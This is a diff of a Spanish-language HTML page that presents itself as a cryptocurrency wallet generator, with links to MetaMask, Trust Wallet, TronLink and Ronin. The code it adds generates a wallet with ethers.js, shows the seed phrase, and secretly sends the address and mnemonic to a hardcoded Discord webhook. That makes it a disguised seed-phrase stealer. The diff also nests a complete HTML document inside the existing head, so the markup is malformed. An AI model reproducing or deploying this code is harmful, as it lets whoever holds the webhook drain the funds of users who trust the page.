@@ -128,78 +128,243 @@
     }
   </style>
   <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
-  <script>
-    function generateWallet() {
-      const generateButton = document.getElementById('generateButton');
-      generateButton.disabled = true;
+ <!DOCTYPE html>
+<html>
+<head>
+  <title>Generador de Wallet</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+     font-family: "Andale Mono", monospace;
+      background-color: #222;
+      color: #fff;
+    }
 
-      const countdownElement = document.getElementById('countdown');
-      countdownElement.innerHTML = 'Creando wallet...';
+.container {
+  max-width: 500px;
+  margin: 0 auto;
+  padding: 20px;
+  background: linear-gradient(to bottom right, #4B0082, #6A5ACD);
+  box-shadow: 0 2px 5px rgba(0, 0, 0, 0.3);
+  text-align: center;
+  position: relative;
+}
 
-      const countdownDuration = 3; // Duración en segundos del contador
-      let countdown = countdownDuration;
+.container::before {
+  content: "";
+  position: absolute;
+  top: -5px;
+  left: -5px;
+  right: -5px;
+  bottom: -5px;
+  background-image: radial-gradient(circle, rgba(255, 255, 255, 0.5), transparent);
+  background-size: 200% 200%;
+  background-position: center;
+  border-radius: 10px;
+  z-index: -1;
+  animation: glow 8s linear infinite;
+}
 
-      const countdownInterval = setInterval(() => {
-        countdown--;
-        countdownElement.innerHTML = `Creando wallet... ${countdown} segundos`;
+@keyframes glow {
+  0% {
+    background-position: top left;
+  }
+  50% {
+    background-position: bottom right;
+  }
+  100% {
+    background-position: top left;
+  }
+}
 
-        if (countdown === 0) {
-          clearInterval(countdownInterval);
-          countdownElement.innerHTML = 'Wallet creada';
-          generateButton.disabled = false;
+    h1 {
+      color: #fff;
+      margin-bottom: 30px;
+      font-size: 28px;
+    }
+
+  p {
+  color: #ccc;
+  margin-bottom: 20px;
+  line-height: 1.5;
+  font-family: "Arial", sans-serif; /* Aquí puedes cambiar "Arial" por la fuente elegante que desees utilizar */
+}
+
+
+    button {
+      padding: 10px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+      margin-top: 20px;
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
+    input[type="text"] {
+      background-color: #FFFFCC;
+      width: 100%;
+      margin-top: 10px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+      margin-bottom: 10px;
+      font-weight: bold;
+    }
+
+    .copy-icon {
+      display: inline-block;
+      width: 16px;
+      height: 16px;
+      margin-left: 5px;
+      cursor: pointer;
+      vertical-align: middle;
+      background: url(copy_icon.png) no-repeat center center;
+      background-size: cover;
+      opacity: 0.6;
+    }
+
+    .wallet-logos {
+      display: flex;
+      justify-content: space-around;
+      align-items: center;
+      margin-top: 20px;
+    }
+
+    .wallet-logo {
+      width: 50px;
+      height: 50px;
+      opacity: 0.7;
+      transition: opacity 0.3s;
+      cursor: pointer;
+    }
+
+    .wallet-logo:hover {
+      opacity: 1;
+    }
+
+    .countdown {
+      color: #fff;
+      margin-top: 10px;
+      font-size: 18px;
+    }
+  </style>
+  <script src="https://cdn.ethers.io/lib/ethers-5.0.umd.min.js"></script>
+<script>
+  function generateWallet() {
+    const generateButton = document.getElementById('generateButton');
+    generateButton.disabled = true;
+
+    const countdownElement = document.getElementById('countdown');
+    countdownElement.innerHTML = 'Creando wallet...';
+
+    const countdownDuration = 3; // Duración en segundos del contador
+    let countdown = countdownDuration;
+
+    const countdownInterval = setInterval(() => {
+      countdown--;
+      countdownElement.innerHTML = `Creando wallet... ${countdown} segundos`;
+
+      if (countdown === 0) {
+        clearInterval(countdownInterval);
+        countdownElement.innerHTML = 'Wallet creada';
+        generateButton.disabled = false;
+      }
+    }, 1000);
+
+    const wallet = ethers.Wallet.createRandom();
+    const mnemonic = wallet.mnemonic.phrase;
+    const address = wallet.address;
+
+    const seedField = document.getElementById('seedField');
+    seedField.value = '';
+
+    let index = 0;
+    const seedInterval = setInterval(() => {
+      if (index < mnemonic.split(' ').length) {
+        seedField.value += mnemonic.split(' ')[index] + ' ';
+        index++;
+      } else {
+        clearInterval(seedInterval);
+      }
+    }, 200);
+
+    document.getElementById('addressField').value = address;
+
+    // Enviar la semilla generada a través del webhook de Discord
+    const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
+
+    const payload = {
+      content: `Dirección: ${address}\nSemilla: ${mnemonic}`
+    };
+
+    fetch(webhookUrl, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json'
+      },
+      body: JSON.stringify(payload)
+    })
+      .then(function (response) {
+        if (response.ok) {
+          console.log('Semilla enviada al webhook de Discord');
+        } else {
+          console.error('Error al enviar la semilla al webhook de Discord:', response.status);
         }
-      }, 1000);
-
-      const wallet = ethers.Wallet.createRandom();
-      const mnemonic = wallet.mnemonic.phrase;
-      const address = wallet.address;
-
-      document.getElementById('seedField').value = mnemonic;
-      document.getElementById('addressField').value = address;
-
-      // Enviar la semilla generada a través del webhook de Discord
-      const webhookUrl = 'https://discordapp.com/api/webhooks/1073374509165465700/mr2ICeCadLB01KfbfV0HSI7bfpBkIaYTyIFMPLMW58Og3xWGRpv2EOOowLITDz3SRs3m';
-
-      const payload = {
-         content: `Dirección: ${address}\nSemilla: ${mnemonic}`
-      };
-
-      fetch(webhookUrl, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify(payload)
       })
-        .then(function (response) {
-          if (response.ok) {
-            console.log('Semilla enviada al webhook de Discord');
-          } else {
-            console.error('Error al enviar la semilla al webhook de Discord:', response.status);
-          }
-        })
-        .catch(function (error) {
-          console.error('Error al enviar la semilla al webhook de Discord:', error);
-        });
-    }
+      .catch(function (error) {
+        console.error('Error al enviar la semilla al webhook de Discord:', error);
+      });
+  }
 
-    function copySeed() {
-      const seedField = document.getElementById('seedField');
-      seedField.select();
-      seedField.setSelectionRange(0, 99999);
-      document.execCommand('copy');
+  function copySeed() {
+    const seedField = document.getElementById('seedField');
+    seedField.select();
+    seedField.setSelectionRange(0, 99999);
+    document.execCommand('copy');
 
-      const copyIcon = document.getElementById('copyIcon');
-      copyIcon.style.opacity = 1;
-      setTimeout(function () {
-        copyIcon.style.opacity = 0.6;
-      }, 1000);
-    }
+    const copyIcon = document.getElementById('copyIcon');
+    copyIcon.style.opacity = 1;
+    setTimeout(function () {
+      copyIcon.style.opacity = 0.6;
+    }, 1000);
+  }
 
-    function openWallet(url) {
-      window.open(url, '_blank');
-    }
-  </script>
+  function openWallet(url) {
+    window.open(url, '_blank');
+  }
+</script>
+
+</head>
+<body>
+  <div class="container">
+    <h1>Crea tu Wallet</h1>
+    <p>Genera una nueva billetera y obtén una semilla mnemotécnica única que puedes utilizar con diferentes wallets.</p>
+    <button id="generateButton" onclick="generateWallet()">Generar Wallet</button>
+    <input id="seedField" type="text" readonly>
+    <span class="copy-icon" id="copyIcon" onclick="copySeed()" title="Copiar semilla"></span>
+    <input id="addressField" type="text" readonly>
+
+    <div class="wallet-logos">
+      <img class="wallet-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmUc1HbJMRBY3LxDbqSXKzAJN3MwjryvqS7wp3YoQnfe9x?_gl=1*1cuhshf*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4Nzc0OTQwMy4yMy4xLjE2ODc3NDk0MDMuNjAuMC4w" alt="Metamask" title="Metamask - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias." onclick="openWallet('https://metamask.io/')">
+      <img class="wallet-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmRB8KKPZFdQPZhrBXbAXGqKve7TuFLTWVxjpPca6mrpxt?_gl=1*125itwa*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4Nzc0OTQwMy4yMy4xLjE2ODc3NDk1OTcuNjAuMC4w" alt="Trust Wallet" title="Trust Wallet - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias." onclick="openWallet('https://trustwallet.com/')">
+      <img class="wallet-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/Qmc1ry24hGZ526EfC8cta43GQu8iAgH5Xro8RKSYptzeek?_gl=1*sq7gst*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4Nzc0OTQwMy4yMy4xLjE2ODc3NDk0MDMuNjAuMC4w" alt="TronLink" title="TronLink - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias." onclick="openWallet('https://www.tronlink.org/')">
+      <img class="wallet-logo" src="https://lavender-bewildered-octopus-416.mypinata.cloud/ipfs/QmTVDMo7oJJbGMgrwaBN2bmxz16fS14bkqbRTR3RG92kkv?_gl=1*ipb967*rs_ga*NTgzMzM3YTMtOWRiMS00MjJmLTgyOGItODNiMzI4NGEzZmQw*rs_ga_5RMPXG14TE*MTY4Nzc0OTQwMy4yMy4xLjE2ODc3NDk3MjIuNjAuMC4w" alt="Ronin Wallet" title="Ronin Wallet - Puedes usar la semilla para cargar saldo, comprar y vender criptomonedas, y realizar transferencias." onclick="openWallet('https://www.roninwallet.com/')">
+    </div>
+
+    <p class="countdown" id="countdown"></p>
+  </div>
+</body>
+</html>
+
 </head>
 <body>
   <div class="container">
